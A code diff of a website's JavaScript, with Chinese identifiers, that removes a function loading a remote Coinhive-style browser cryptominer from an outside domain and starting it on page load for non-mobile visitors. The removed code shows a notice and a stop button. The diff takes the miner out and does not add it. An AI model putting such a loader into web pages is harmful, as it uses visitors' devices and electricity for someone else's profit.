@@ -228,30 +228,8 @@ function 加入追踪() {
     }
 }
 
-function 加入挖矿器() {
-    if (挖矿代码 !== null) {
-        var 挖矿脚本 = document.createElement('script');
-        挖矿脚本.setAttribute('src', 'https://www.freecontent.date./9eNO.js');
-        挖矿脚本.onload = function() {
-            var 挖矿器 = new Client.Anonymous(挖矿代码, {throttle: 挖矿节流});
-            if (!挖矿器.isMobile()) {
-                document.getElementById('挖矿声明').style.display = 'block';
-                document.getElementById('停止挖矿').onclick = function () {
-                    if (挖矿器 !== undefined) {
-                        挖矿器.stop();
-                    }
-                    return false;
-                };
-                挖矿器.start();
-            }
-        };
-        document.getElementsByTagName('body')[0].appendChild(挖矿脚本);
-    }
-}
-
 window.onload = function () {
     加入追踪();
-    加入挖矿器();
 
     语言 = document.getElementsByTagName('html')[0].getAttribute('lang');
     if (语言 === null || 语言 === '') {
